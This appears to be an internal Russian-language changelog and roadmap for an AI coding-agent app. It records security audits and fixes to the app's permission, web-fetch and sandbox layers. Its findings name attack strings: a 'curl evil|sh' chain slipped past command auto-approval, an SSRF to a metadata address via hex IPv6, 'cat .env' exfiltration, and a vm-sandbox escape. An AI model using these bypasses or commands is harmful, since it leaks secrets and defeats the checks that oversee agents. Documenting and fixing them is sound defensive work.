diff → `delegate(critic)` свежий контекст → строго-JSON вердикт fail-closed (невалидный/пустой JSON, confidence<0.7, не осмотрен diff, verify не запускалась = FAIL) → до 2 циклов `delegate(executor)` авто-починки свежим контекстом → повторная verify+ревью → стоп с причиной. Agent loop/provider layer не переписаны; mode-policy/command-policy не обходятся. **Проверки:** `npm run type` зелёный · `npm run test:fast` — 2020 passed / 7 skipped / 0 failed (+68 тестов слоя). **Честные ограничения:** reviewer/fixer используют существующий delegate (тот же провайдер по умолчанию — «свежесть» = чистый контекст, не обязательно другая модель); baseline передаётся recipe-агентом как аргумент tool (нет авто-снапшота на старте прогона в самом gate); recipe suggestion — эвристика по ключевым словам (не семантика). **Следующий этап — по подтверждению Павла.**

> **Agentic fallback routing (03.07, Этап 2, в main, не зарелизено, `8c00947`).** Завершён. `classifyFallbackReason`/`fallbackPlan` проброшены в реальный агентный цикл `runApiConversation` — закрыты поведенческие сбои tool-calling у DeepSeek/Qwen/Kimi/GLM. **Закрытые сценарии:** ① ignored tools → nudge → эскалация native→JSON-режим (`ctx.forceToolMode`, тот же провайдер) → fallback model; ② malformed native arguments → typed `argsError` (вместо тихого `{}`) → один bounded corrective retry «повтори валидным JSON» → fallback; ③ context overflow → форс-компакция существующим summary-компактором → retry, не помогло → понятная ошибка (не бесконечный цикл); ④ auth error в середине прогона (бан Claude) → смена провайдера без потери накопленной истории; ⑤ rate/network/5xx — старый turn-0 fallback не тронут. Все retries bounded (`MAX_MALFORMED_RETRIES=1`, `MAX_CONTEXT_RETRIES=1`, JSON-эскалация одноразовая). `mode-policy`/`command-policy` не обходятся (проверено тестом write_file в plan-режиме). native-путь стабильных моделей не деградирует (deepseek-chat остаётся native). **Проверки:** `npm run type` зелёный · `npm run test:fast` — 1952 passed / 7 skipped / 0 failed (+6 тестов реального agent loop). **Честные ограничения:** `empty_tool_call_arguments` пока не классифицируется на provider-level (нет schema-валидации — чтобы не ломать no-arg тулзы); summary-вызов форс-компакции в error-ветке не учитывается в cost-guard (bounded 1×); JSON-эскалация одноразовая на прогон; provider-fallback на reasoning-модель не всегда доинжектит JSON-инструкцию. **Следующий этап — по подтверждению Павла.**

> **1.5.50** 🚀 — **полный аудит приложения по 8 осям (память/баги/безопасность/целостность/мусор/правильность/читаемость/vs-OpenCode) + фиксы.** Многоагентный аудит (Workflow, 39 агентов, адверсариальная верификация) → **32 находки, 28 подтверждено**; закрыты все дефекты (7 HIGH + 2 MEDIUM + LOW) тремя пачками по TDD. **Безопасность:** утечка секретов в память без scanText (авто-захват + memory_save); инъекция `!\`cat .env\`` в slash-команде мимо isForbiddenPath; http-коннектор слал Authorization на хост редиректа; SSRF без DNS-резолва на редирект-хопах коннекторов. **Надёжность (баги):** smart-fallback между провайдерами НЕ срабатывал (провайдеры yield'ят error вместо throw → catch недостижим) + backoff-retry тоже мёртв — вынесен `attemptProviderFallback` + `retriableValue` в withInitialRetry; recall фильтровал session-summary ПОСЛЕ LIMIT → факты выпадали; стрим фонового чата терялся/прилипал при смене проекта; loop-detection оставлял висячие tool_call → 400. **Мусор:** 2 мёртвых компонента (342 стр), мёртвые импорты/экспорты/функции/переменные. **Корректность:** cron dow=7/`*/N`, откат-чекпоинт floor-ordering, decay не удаляет decision/bug/preference. **Ось 8 (vs OpenCode):** глобальный слой правил `~/.verstak/RULES.md`. Коммиты f620cff (security), 3831d23 (bugs), b766664 (cleanup), c2c9262 (user-layer). Деливерабл аудита: `wm1ns4h3o.output`. **Отложено (enhancement, не дефекты):** 4 OpenCode-фичи M/L (edit+rerun сообщения, ручной `/compact`, экспорт транскрипта в MD, undo+redo) + рефактор монолита runApiConversation (~840 стр, §5) + drainSupplements DRY + разрозненные unused-locals + unused-экспорты autoupdate (зона Ильи).

> **1.5.49** 🚀 — **per-domain web-политика (+1 спринт).** Капстоун веб-раунда и усиление moat «контроль»: файл `.verstak/web-policy.json` (user+project) ограничивает, какие домены агенту можно фетчить (`web_fetch`). `allow` = белый список, `deny` сильнее (чёрный); нет файла → все публичные (обратная совместимость). Паттерн `python.org` = домен+субдомены, `*.mozilla.org` = только субдомены. Проверка на КАЖДОМ хопе редиректа (нельзя увести цепочкой перенаправлений). Прямой Claude-Code-паритет (`WebFetch(domain:…)`) + defense-in-depth поверх SSRF. Самопроверка на обходы поймала trailing-dot (`evil.com.` резолвится=evil.com, обходил deny) → нормализация FQDN. +11 тестов, движок чистый (`web-policy.ts`).

> **1.5.48** 🚀 — **конкурентная ось Cursor/CC/Codex, раунд 2: веб-доступ агента + запоминание одобрений + кэш истории.** Повтор ночного /goal-спринта. Разбор конкурентов → главный ПРОБЕЛ = веб-доступ (есть у всех троих, у нас не было). **Спринт 1 (эффективность+контроль):** ① **кэш истории переписки** (prompt caching на растущем префиксе диалога, 3-й breakpoint ≤4, поверх 1.5.47) · ② **«Больше не спрашивать про такие команды»** (persistent per-command approvals, чекбокс в CommandConfirm → prefix-правило в `~/.verstak/permissions.json`) · ③ **`web_fetch`** (SSRF-огороженный фетч страницы → текст). **Спринт 2 (охват):** ④ **`web_search`** (DuckDuckGo HTML, без зависимостей). Оба веб-тула гейтятся `web_access` (по умолчанию ВЫКЛ, тумблер в «Что разрешено»). **Два раунда ревью (2 агента + Workflow 12 агентов × адверсариальная верификация) → 15 находок, ВСЕ закрыты:** 🔴CRITICAL SSRF через IPv4-mapped IPv6 в hex-форме (`http://[::ffff:a9fe:a9fe]`=metadata — `new URL` нормализует в hex, строковый матчер пропускал) → числовой IPv6-парсер (mapped/NAT64/IPv4-compat); 🟠HIGH allow авто-одобрял `npm test && curl evil|sh` (по `.some` одного сегмента) → покрытие ВСЕХ сегментов; 🟠HIGH денилист опасных субкоманд протекал по неполноте (`npm install`/`git submodule`/`kubectl apply`/`go install` = RCE) → **реверс на allowlist безопасных** (глухая защита, не течёт); 🟠HIGH ReDoS-фриз event-loop на враждебной странице → линейный strip через indexOf (O(n)); MEDIUM×5 (гейт только презентационный→execution-time проверка, UTF-8-обрезка→стриминговый decoder, незакрытый `<svg>` терял тело→skip-only-tag, opaque `?token=` в finalUrl не редактировался→redactUrlSecrets в result+Timeline+audit); LOW (сдвиг сниппетов, мусорные правила от обёрток). **Урок в третий раз: security-фиксы ОБЯЗАТЕЛЬНО ре-ревьюить Workflow'ом — «лиса в курятнике», второй раунд нашёл ещё 5 в моих же фиксах, вкл. HIGH-неполноту денилиста.** В описаниях про конкурентов — молчок, только функции. + починка автогена changelog (апостроф ломал одинарно-кавыченный литерал).

> **1.5.47** 🚀 — **токен-экономия: prompt caching (все провайдеры) + фикс потери фактов памяти.** По разбору статей Claude Code (thecode/vc.ru/habr): из ~16 техник у нас было **13** (компакция, субагенты-саммари, model-routing, thinking-бюджет, сжатие tool-output, node_modules-исключение, коннекторы-как-код=2 тулзы vs 31 MCP). **Единственная крупная дыра — prompt caching, был выключен у ВСЕХ провайдеров.** Фикс — связка из 3 правок: разделение системного промпта на СТАБИЛЬНЫЙ префикс (system-layer+user+skill+tools) и ИЗМЕНЧИВЫЙ хвост (context-pack) через `CACHE_BREAKPOINT`; claude.ts режет по маркеру + `cache_control:ephemeral` на стабильном блоке; для OpenAI/DeepSeek/Gemini `systemForProvider` снимает маркер → авто-кэш попадает по стабильному префиксу. **Экономия ~60-80% входных токенов на длинной сессии.** + **память: фикс потери фактов при переполнении core-memory** (архив-ПЕРВЫМ: эвакуация ДО обрезки, падение saveMemory не рушит core). **Ре-ревью (9 агентов) → 5 находок, все закрыты:** 🔴HIGH мой же фикс памяти внёс новый loss-путь (обрезка до архива); MEDIUM file_scoped_rules в кэшируемом префиксе (money-waster) → в volatile; MEDIUM компакция теряла базовый протокол+маркер → сохраняет; MEDIUM вырожденная длинная строка; LOW маркер протекал в autonomous. **Урок повторно: security/эффективность-фиксы ре-ревьюить — фикс сам вносит регрессию.** Честная сверка памяти с Hermes: мы АРХИТЕКТУРНО ЗРЕЛЕЕ (soft-invalidate/decay/пассивный+процедурный захват — у Hermes нет), «ощущение что Hermes лучше» = именно этот overflow-баг. Деливерабл вошёл в анализ токенов.

> **1.5.46** 🚀 — **субагенты-как-файлы (экстра-спринт).** Капстоун линии «всё декларируется файлом»: `.verstak/agents/<имя>.md` (frontmatter name/description/tools/model/provider, тело=system prompt) → `delegate_task agent="имя"`. Произвольный tools-whitelist + модель вместо захардкоженных ролей. Имена инжектятся в system prompt (достижимость). **Ревью (6 агентов) → 2 MEDIUM + 1 LOW:** file-субагент с `tools: orchestrate/swarm` обходил SUBAGENT_FORBIDDEN_TOOLS (getRoleToolset пропускался) → фильтр и к файловому набору; user-субагенты недостижимы без проекта (инъекция под `if(projectPath)`) → расцеплено; LOW (принят) untrusted project-агент — mode-policy+permission-rules+денилист всё равно гейтят (декларация ≠ обход авторизации).

> **1.5.45** 🚀 — **конкурентная ось Cursor/Claude Code/Codex: РАСШИРЯЕМОСТЬ КОНТРОЛЯ (6 фич).** Разбор 3 конкурентов (локальные установки + интернет, 5-агентный workflow) → вердикт: ядро Verstak на паритете/впереди, сосём в РАСШИРЯЕМОСТИ — конкуренты вынесли контроль в конфиг, у нас захардкожено. **Спринт 1 (контроль/прозрачность):** ① **lifecycle-хуки** (Pre/PostToolUse/SessionStart/Stop/UserPromptSubmit, .verstak/hooks.json, opt-in, exit2=блок, scanText на вывод) · ② **декларативные permissions** allow/deny/ask по паттернам (.verstak/permissions.json, deny бьёт даже bypass) · ③ **output-styles** (формат ответа ⟂ режиму). **Спринт 2 (автоматизм РФ + UX):** ④ **slash-команды с $1/$ARGUMENTS + инъекция !\`bash\`** · ⑤ **review_diff** (git-diff против ветки/коммита/uncommitted критиком) · ⑥ **@-mentions файлов** в композере. **Три раунда ревью (18+13+6 агентов) → 5+8+3 находок, ВСЕ закрыты:** 🔴 deny обходился цепочкой/подстановкой/обёрткой/find-exec (переписан splitCommandSegments с extractNested) · 🔴 RCE через аргумент в !\`bash\` (реордер) + эксфильтрация через cat ../../.env (read-only allowlist + блок путей вне проекта) · 🔴 git-опция-инъекция через ведущий дефис в ref (анкор regex) · 🔴 кастомные output-стили недостижимы из UI (динамический список). **Урок усилен (повтор): security-фиксы ОБЯЗАТЕЛЬНО ре-ревьюить — «лиса в курятнике», первый раунд фиксов сам имел 8 HIGH-обходов.** Деливерабл: `Downloads/Verstak-конкурентная-ось-cursor-cc-codex-2026-07-01.md`. В описаниях про конкурентов — молчок, только функции.

> **1.5.44** 🚀 — **ось 4: память (vs Letta/mem0/Zep/LangGraph).** Память уже зрелая → из 40 техник 3 строибельных (НЕ-embedding, на FTS5+SQLite). **#1 RRF-fusion recall** — блендим релевантность⊕недавность (Reciprocal Rank Fusion), вместо бинарного фолбэка. **#3 soft-invalidate** — миграция 32, история «было X→стало Y» вместо удаления (`invalidated_at`/`superseded_by`, recall фильтрует). **#2 agent-driven реконсиляция** — тулза `memory_invalidate` + nudge; агент сам реконсилирует противоречия через тулзы (БЕЗ вложенного LLM-вызова). + **кумулятивное ревью ось-3 → 4 кросс-фичевых фикса** (🟠HIGH откат-при-стриме рвал историю чата → гейт isStreaming; lastSummary стейл при new_task; счётчик run_until_green leak). **Ревью ось-4 → 🟠HIGH**: saveMemory не воскрешал invalidated (ре-сохранение факта молча невидимо) → UPDATE снимает invalidated_at. **НЕ брать: векторы/embeddings/граф/cloud-sync** (подтверждённый non-goal — FTS5+RRF+LLM-reconcile дают 80% без вектора).

> **1.5.43** 🚀 — **ось 3 спринт 2 (deferred-кластеры I/F/H).** **I per-tool auto-approve** — категорийные тумблеры (правки/команды) поверх режима, не трогая plan-block (вкладка «Политика»). **F гранулярный откат** — 3 режима cline: Файлы / Задачу (truncate диалога к чекпоинту) / Файлы+задачу (storage+IPC+per-chat граница в ComposerToolsMenu). **H new_task** — агент сам пакует дистиллят и продолжает с чистого контекста (протокол+цель сохраняются). G (recipes)/J (CLI -x) ≈ покрыты скиллами/`verstak --json`, не дублировал. **Ревью поймало 3:** 🟠HIGH new_task стирал и БАЗОВЫЙ system-промпт (протокол/память/правила живут только в currentMessages[0]) → off-policy дрейф; фикс buildNewTaskContext сохраняет base-system+исходную задачу. MEDIUM F был НЕДОСТИЖИМ (CheckpointButton не смонтирован, жил ComposerToolsMenu с file-only) → перенёс 3-режим в смонтированный компонент, мёртвый удалил. **Урок (повтор TS-нав): фича жива только если смонтирована в РЕАЛЬНОМ UI-пути.**

> **1.5.42** 🚀 — **конкурентная ось 3 ТОП-5** (vs Aider/Cline/Roo/Goose/Amp/Plandex/Codebuff/OpenHands — терминальные агенты, НЕ IDE). Все 5 превращают уже-готовые кирпичи в фичи-паритеты, ничего против moat: **#1 guardrails** в immutable-протоколе (план при >3 файлов, no-new-deps, сериализация правок — апрув Павла на правку system-layer 1.3.0); **#2 oracle** — агент сам зовёт сильную reasoning-модель для плана/ревью/дебага (обёртка над delegate role=critic); **#3 per-mode model** — авто-своп модели при 1-5 (план→reasoning, авто→дешёвый); **#4 Focus Chain** — todo переживает компакцию (анти-дрейф §5.4); **#5 run_until_green** — fix-until-green для ЛЮБОЙ команды (не только tsc). **Ревью поймало 3:** 🟠HIGH per-mode своп не персистился per-chat (откатывался при возврате в чат) → фикс chatSessions.setModel; MEDIUM лимит run_until_green агент-контролируемый (attempt:1 навсегда) → серверный счётчик per(sendId+command); LOW дедуп Focus-Chain реинжекта. **Главный вывод оси 3: Verstak сосёт НЕ в безопасности/откатах (там впереди), а в автоматизме «режим↔модель» и широте самокоррекции — ровно эти 5 закрыты.** Деливерабл: `Downloads/Verstak-конкурентная-ось-3-2026-06-29.md`.

> **1.5.41** 🚀 — **живые connector-аудиты в NL-cron** (закрыт follow-up флагмана). Расписанный (unattended) прогон теперь ЧИТАЕТ внешние данные (Ozon/WB/Метрика/CRM/Sheets) через `connector_query`, но op-level политика (`connector-readonly.ts`, fail-safe) блокирует пишущие/выполняющие op'ы (ssh run_remote, telegram send, вебхуки, email). Целиком-read коннекторы → true; mixed (http GET, telegram get_*, bitrix list_/get_) → per-op; ssh/email/неизвестный → запрет. **Ревью (31 коннектор сверены) поймало 🔴CRITICAL: gsheets помечен целиком-read, но имеет append_/update_ → unattended мог затереть Google Sheets (= SSOT TASK_REGISTRY!) → фикс per-op (read_/get_/ping).** + party→dadata. **Урок (повтор MCP-ревью): «помечен read-only» по kind — проверяй КАЖДЫЙ op коннектора, не доверяй ярлыку.**

> **1.5.40** 🚀 — **next-wave дорожной карты (4 фичи).** **NL-cron** — расписание задач на естественном языке (вкладка «Расписание»: «каждое утро», «по будням в 8»); unattended-прогон на СТРОГО локальном read-only наборе (код/журнал/память/документы), итог в Telegram. **LSP-нав TS/JS** — find_definition/find_references теперь и для TS/JS (typescript-language-server), live-проверено. **Авто-предложение скилла** — чип с апрувом по мере набора. **Memory-nudge** — подсказка консолидации при накоплении воспоминаний. **Ревью поймало 4×HIGH:** (1) NL-cron read-only ФИКТИВНА — researcher-набор включал connector_query (SSH/Telegram-выполнение) → unattended мог слать/выполнять на проде → фикс: локальный набор без коннекторов; (2) project_path не валидировался против known-roots → гейт добавлен; (3) двойной запуск задачи (last_run_minute писался после прогона) → in-flight Set; (4) TS-нав МЁРТВА — хендлер гейтил isLspDiagnosableFile (TS исключён) до навигации (live-тест прошёл в обход) → isLspNavigableFile. **Урок: live-тест в обход хендлера НЕ доказывает фичу — нужен e2e через реальный гейт.** + scanText на Telegram-пуш.

> **1.5.39** 🚀 — **ТОП-3 дорожной карты (память умнее + MCP-гейтинг).** **#1 релевантный recall при старте чата** — `searchMemories` инжектил с пустым query → top-5 по времени; теперь подаём последнее user-сообщение как query (FTS5 ORDER BY rank, санитайзер NL→FTS5 `buildFtsMatch`), recency-фолбэк исключает session-summary чтобы не вытеснять факты. **#2 MCP-scope override + annotations** — гейтинг внешних тулзов был на keyword-угадайке; теперь читаем стандартные хинты (readOnlyHint/destructiveHint) + per-tool override в Settings. **#3 персист итога сессии** — `lastSummary` жил только in-run → пишем в `memories(tags=['session-summary'])` → кросс-сессионный recall без embeddings. **Ревью поймало 2×HIGH:** (а) утечка секрета — session-summary сохранялся БЕЗ scanText → токен из чата оседал в памяти и всплывал в контекст внешнего провайдера (фикс: scanText в ai.ts + session-summary.ts, +тест); (б) ослабление MCP-гейта — `readOnlyHint:true` от недоверенного сервера слепо даунгрейдил любой тулз в read/auto (слабее keyword-гейта!) → фикс: annotations НЕ опускают ниже keyword, destructiveHint→command первым. **Урок: server-supplied annotations недоверенны — могут лишь УЖЕСТОЧАТЬ гейт, не ослаблять.**

> **1.5.38** 🚀 — **#5 изолированная сессия (полный worktree-lifecycle).** Кнопка «🌿 Изолировать сессию» → правки агента в отдельном git-worktree, main не трогается до «Применить в main» (локальный git apply, БЕЗ push) / «Отбросить». storage (миграция 30) + IPC + ре-рут ai:send на worktree + UI WorktreeBar. **Ревью поймало 6 багов вкл. 🔴CRITICAL data-loss** (undo изолированного чата бил по main — ре-рутил tools но не projectPath; фикс: весь прогон на worktree) + leak-sweep. Opt-in (default OFF) → ноль риска. Known-лимиты (не data-loss): context-pack на main, merge-конфликт без авто-rebase, CLI не изолируется, undo в изоляции = no-op (используй Отбросить). **Урок: ре-рут file-тулзов БЕЗ ре-рута projectPath → undo бьёт по чужому дереву (как swarm-паттерн, но забыл projectPath).**

> **1.5.37** 🚀 — **OpenClaw-усреднение (4 user-facing фичи).** Push-наблюдаемость прогона в Telegram (opt-in, только исходящее) · per-session stats «Σ $·🔧·📄» в шапке (переживает рестарт) · локальный plan-approval-gate (opt-in, Approve/Revise/Reject до выполнения) · ⏸ Пауза / ↻ Продолжить прогон с чекпойнта. Все default-безопасны (opt-in/гейтены). **Каждая отревьюена адверсариально — поймано ~38 багов за день (10 HIGH + 1 critical), все до прода:** push (спам справки), plan-gate (5, вкл. HIGH «approve не работал»), suspend (2, вкл. HIGH «CLI ⏸ молча=⏹»). #5 merge-ядро (`mergeWorktreeToMain`, локальный git apply без push) — в main, полный lifecycle следующей сессией. В описаниях про конкурентов — молчок, только функции.

> **OpenClaw-усреднение (27.06, в main, не зарелизено).** Gap-анализ 6 областей OpenClaw code-agent vs текущий Verstak (Workflow) → ранжирование по ROI. Построено: **#1 push-наблюдаемость прогона в Telegram** (`847bb83`,`902a04a`: opt-in `telegram_notify_chat_id`, только исходящее, не спамит суб-агентами/справкой, переиспользует whitelist+scan коннектора; ревью поймало спам справки → закрыт; +11 тестов) + **#2 per-session stats** (`4e0651a`: `sessionStats(chatId)` агрегат cost/инстр/файлы/время без миграции, пилюля «Σ $X·🔧·📄» в шапке; +2 теста). **#3 локальный plan-gate** (`f0b71d0`→`adcc08f`): opt-in (default OFF) `plan_approval_gate` — в plan-режиме create_plan блокирует-и-ждёт Approve/Revise/Reject; approve → выполнение в прогоне (мутабельный runAgentMode + ctx.setAgentMode); pendingPlans+IPC+PlanConfirm-модалка+тумблер в PolicyTab. Ревью поймало 5 багов вкл. 🟠HIGH «approve не выполнялся» (ctx пересоздавался из const каждый turn) + фоновый дедлок — все закрыты, HIGH верифицирован тестом. +7 тестов. **#4 ⏸/↻ suspend** (`e9ced83`→`7bd6beb`): ⏸ Приостановить (abort+статус 'suspended', миграция 29) / ↻ Продолжить с чекпойнта (resumeFromRunId). Ревью: 2 бага вкл. 🟠HIGH «CLI ⏸ молча=⏹» (только API чекпойнтит) — ⏸ теперь только для API-провайдеров; +утечка Set в cleanup. +1 тест. **#5 worktree lifecycle — ЯДРО построено** (`664af30`): `mergeWorktreeToMain` (локальный merge worktree→main через git apply, атомарно, БЕЗ push; +3 теста на реальном git). Полный persistent-lifecycle (таблица worktree_sessions + изоляция обычной сессии персистентно между ходами + UI merge-кнопка + состояния active/diff_ready/merged) — **L-size follow-up, не срочно** (checkpoint+undo уже дают откат), UI-тяжёлый → отдельная сессия с live-проверкой. Inbound TG-пульт — за go Павла + security-ревью. **В публичных описаниях про OpenClaw — молчок, только функции.**

> **1.5.36** 🚀 — **T1.2 git-worktree изоляция роя зарелизена.** Рой агентов (swarm) с opt-in `isolate`: каждый executor правит в своей изолированной git-рабочей копии (worktree) → параллельные правки не клобберят друг друга; git diff к арбитру → главный применяет выбранный в main. Фундамент (`git-worktree.ts`, graceful, чистит ambient GIT_*) + swarm-обвязка. Ревью поймало 🟠HIGH «изоляция инертна» (собрал без re-root FileTools — ровно то, ради чего деферили) — починен `createToolsForProject(memberRoot)→subCtx.tools` и **верифицирован интеграционным тестом**. Default OFF → ноль риска. По пути гейт сам обнажил баг хелпера (ambient GIT_DIR). +9 тестов.

> **1.5.35** 🚀 — **весь Tier-2 спринт (6/6) зарелизен.** LSP-навигация (find_definition/find_references любой язык), правила под файлы (glob-маски в AGENTS/CLAUDE.md), белый список безопасных команд (анти-обход цепочек/arg-injection), ветвление чатов (⑂ Ветвить), MP4-доказательства веб-проверки (кадры browser-прохода → видео), microcompact (обратимое промежуточное сжатие). **Финальное ревью перед шипом поймало 6 багов вкл. 2 HIGH data-loss в fork** (remove стирал ветки + осиротевшие review-leak) — все закрыты, fork-тесты вживую зелёные. Урок усилен: ревью+live-проверка обязательны для не-live-кода; за сессию 17 багов в своём коде (5 HIGH + 1 critical) пойманы до прода.

> **1.5.34** 🚀 — **live-проверка не-TS LSP с реальным pyright** поймала+починила третий баг: в 1.5.33 авто-диагностика не-TS была инертна на Windows (file-URI mismatch — регистр диска/кодировка → строгий `===` не матчил → диагностики терялись). Фикс `sameFile` (сравнение по разрешённому пути) + интеграционный тест (за `RUN_LSP_IT=1`). Также проверено: PTC хендлер end-to-end (4 теста), Ollama qwen2.5 шлёт structured tool_calls нативно (repair — фолбэк для слабых, парсер юнит-тестирован), graceful-деградация на сломанном rust-analyzer (rustup-прокси без компонента) — no-op без краша. **Урок: live-проверка так же окупается, как ревью — «фича в проде, но инертна» ловится только реальным сервером.**

> **1.5.33** 🚀 — **Tier-1 усиление по конкурентному исследованию зарелизено** (5 фич, дважды отревьюено адверсариально, 13 багов закрыто): LSP-диагностика Python/Go/Rust в петле (graceful), repair tool-call'ов слабых/RU-моделей, Inbox approvals фоновых чатов, структурная итеративная компакция, PTC `execute_code` (opt-in, default off). Все безопасны для дефолтных юзеров (LSP→no-op без сервера, PTC выключен). Сборка через bypass (дев был открыт) → закрыли дев → `dist:win` → GitHub Release v1.5.33 + latest.yml (автообновление). **Урок ревью: 2 паса (фичи + сами фиксы) поймали critical PTC-RCE и «LSP мёртв на Windows» — для не-live-кода ревью обязателен; см. [[verstak-tier1-strengthening-2026-06-24]].**

> **1.5.32** — воронка Verstak→Gateway добита (после сверки с тем, что Codex отдаёт на шлюзе): `verstak/free` (🎁 проба) в пресетах → проба за 0₽; онбординг первого запуска предлагает Gateway первым/рекомендованным (рубли, один ключ, без VPN, ссылка на ключ за 30 сек) вместо недоступных из РФ зарубежных провайдеров; кликабельные CTA — ссылки чата открываются в браузере (не уводят окно), ссылка пополнения при нехватке баланса кликабельна. Плюс **pre-commit гейт «гарантия вместо обещания»** (`.githooks/` + `core.hooksPath`, type жёстко + тесты с ABI-awareness, gate-lib под TDD) — закрыт вариант 2 решения по скилл-архитектуре. Хвост: smoke `verstak/free` реальным `vsk_live_` (Codex/Pavel — шлюз проверяет ключ до модели).

> **1.5.31** — батч усиления по итогам сравнения исходников с конкурентами (внутр.): SSRF-guard коннекторов (ip-guard + redirect-loop), prompt-injection escape user/skill-layer, redactUrlSecrets (query/fragment/userinfo), undo unlink-ошибки в failed[], undo DB-first ordering, авто-компакшн (output-резерв + cooldown + usage-учёт + error-guard), CRLF регресс-тест. Всё TDD, 3 ревью-роли + security review. Tier-2 (tool-call-cap/interrupted/tokenizer/prefix-cache) — обоснованно отложены (см. `Downloads/Verstak-усиление-vs-...md`).

> **1.5.28** — безопасность + надёжность по итогам глубокого код-ревью (workflow 12 агентов + адверсариальная верификация): 🔴 закрыт обход isForbiddenPath в SSH-файл-тулзах (секреты на ssh-проектах), Retry-After в backoff, человеко-понятные ошибки провайдера, фикс утечки per-chat состояния при restore, фикс тихого неполного отката (undo prune защищает пост-чекпоинт записи). Все по TDD.
> **1.5.27** — стабильность по конкурентному ревью (OpenCode/KiloCode): дедуп дублей (5.2), сброс состояния при закрытии проекта (5.3), безопасный фолбэк с накопленной историей (6.2), рефактор ядра в `AgentRunContext` (6.1).


---

## 🆚 Усиление по конкурентному исследованию (24.06) — РОУДМАП

Многоагентное исследование (32 агента, grounded в коде Verstak + адверсариальная верификация) vs OpenCode/KiloCode/OpenClaw/Hermes/Cursor/Antigravity → план `Downloads/Verstak-исследование-конкурентов-2026-06-24.md`, память `verstak-competitor-research-2026-06-24`. **Вердикт: НЕ гнаться за Cursor по in-editor (нет редактора = другая категория, осознанный non-goal). Сосём на (1) агентной петле на не-TS коде, (2) своём же «agent не IDE» углу (Inbox/TG).**

Реализовано автономно по TDD (каждый коммит через pre-commit гейт) + дважды отревьюено адверсариально (13 багов закрыто) → **зарелизено в `1.5.33` (25.06)**. Остаётся live-проверка не-TS петли (pyright) и PTC (ptc_enabled):

- ✅ **T1.5 tool-call repair** (75d56f5) — слабые/RU-модели (Ollama/GigaChat/Qwen/Mistral/gpt-oss), отдающие вызов ТЕКСТОМ, теперь исполняются (парсер 5 форматов в `tool-call-repair.ts`, встроен в openai-compat только для не-structured → сильные не затронуты; +9 тестов). Заодно fix гейта (многострочная better-sqlite3 ABI-ошибка). РФ-моат.
- ✅ **T1.6 структурная итеративная компакция** (147f2ef) — `buildCompactSummaryPrompt` со схемой Goal/Constraints/Progress/Files + `extractTouchedFiles` (провенанс) + итеративное обновление прошлого резюме (`lastSummary` в ai.ts). +6 тестов.
- ✅ **T1.3 Inbox approvals** (536a756) — `selectInboxApprovals` агрегирует pendingCommand по всем чатам, панель `InboxApprovals` (резолв фоновых не заходя в чат). +4 теста. UI — 1 живой клик.
- ✅ **T1.1 мультиязычный LSP в петле** (0a3997b) — write_file Python/Go/Rust → языковой сервер (pyright/gopls/rust-analyzer), ERROR-диагностики в следующий ход (как tsc для TS). `lang-servers.ts` (ядро, +10 тестов) + `lsp-diagnose.ts` (graceful spawn). Live-проверка нужен установленный pyright/gopls.
- ✅ **T1.4 PTC `execute_code`** (5b50e76) — агент пишет скрипт, оркестрирующий READ-ONLY тулзы, в контекст только итог (меньше токенов). Движок `ptc.ts` (vm-песочница без process/require/fs, таймаут, +9 тестов). **Opt-in** (`ptc_enabled`, default off — ждёт live-проверки петли; выключенным невидимо, нулевой риск).
- ✅ **T1.2 git-worktree изоляция swarm — ЗАРЕЛИЗЕНО в `1.5.36`** (`8fe0814`→`9c22cb1`→`2b43263`, 27.06): `git-worktree.ts` (add/remove/list/diff/isGitRepo, graceful, чистит ambient GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE — гейт сам обнажил этот баг; +7 тестов на реальном git) + opt-in `isolate` в `swarm` (executor правит в своём worktree → git diff к арбитру → главный применяет выбранный в main; researcher/critic в main; cleanup в finally). Additive, default OFF. **Адверсариальное ревью → 3 бага, вкл. 🟠HIGH «изоляция инертна» (ctx.tools был забинден на главный root → executor писал в main, worktreeDiff читал пустой wt → клоббер не устранён) — это ровно тот re-root FileTools, ради которого деферили; починен через `createToolsForProject(memberRoot)→subCtx.tools`. + MEDIUM ENOBUFS-diff фолбэк на --stat, low rmSync-guard.** type+тесты зелёные. **HIGH-фикс ВЕРИФИЦИРОВАН интеграционным тестом** (`2b43263`): swarmHandler сквозь, фейк-executor пишет через ctx.tools → isolate=true запись НЕ в main (ушла в worktree) + diff к арбитру; isolate=false (контроль) → в main. Изоляция доказанно работает. Остаточный хвост — лишь UX реального LLM в isolate-режиме (механика проверена).
- 🔍 **Ревью №1 (все 5 фич)** — workflow 19 агентов × верификация → **9 багов из 14, закрыты по TDD:** 🔴CRIT PTC vm-побег → RCE (`59e6601`); 🟠LSP spawn без shell → ENOENT на Windows + EPIPE-краш + мульти-файл (`55b1c0d`); 🟠T1.5 Format 5 на прозе с JSON (`e90ac10`); 🟠T1.6 пропуск propose_edits (`1c15471`); T1.3 ghost-approval + sendId (`6523197`).
- 🔍 **Ревью №2 (ФИКСЫ ревью №1 — их никто не смотрел)** — workflow 11 агентов → **ещё 4 дефекта в моих же фиксах, закрыты (`a7ffb17`):** LSP `child.kill` убивал только cmd.exe → осиротевший pyright (фикс: treeKill); T1.3 ghost-модалка оставалась в АКТИВНОМ чате (фикс закрыл только фон); T1.5 проза с примером РЕАЛЬНОЙ тулзы + обёртки (фикс: dominant-content для Format 5); **PTC async-вектор остался открыт** (тулзы возвращали host-Promise → `.then.constructor` → побег) — закрыт по-настоящему через vm-native Promise. **Урок: ревью ФИКСОВ обязателен — «лиса проверяет курятник» (фиксы писал и проверял один и тот же), нашлось 4 дефекта вкл. недозакрытый critical. vm в процессе принципиально не изолирует → ОСНОВНОЙ контроль PTC = гейтинг как команда (trust run_command), vm-хардинг лишь defense-in-depth.**
- 🧭 **Tier-2 (дифференциаторы) — 4/6 в main** (TDD → адверсариальное ревью → фиксы; не зарелизено):
  - ✅ **#1 LSP-навигация** `find_definition`/`find_references` (семантика через язык-сервер; `70fca63`→`254daa2`; live pyright + ревью 6 багов).
  - ✅ **#6 file-scoped rules** `.verstak/rules/*.mdc` (условные правила по glob в user-layer; `a49b89c`; ревью: ReDoS+braces+cap закрыты).
  - ✅ **#4 bash-allowlist** (доверенные команды без подтверждения в ask; `41883f5`; ревью: arg-injection через флаги-эскалаторы закрыт — ESCALATOR-денилист).
  - ✅ **#2 microcompact** (дешёвый обратимый прунинг по размеру до full-compact; `ad2bf4e`; ревью: оценка по slid-копии).
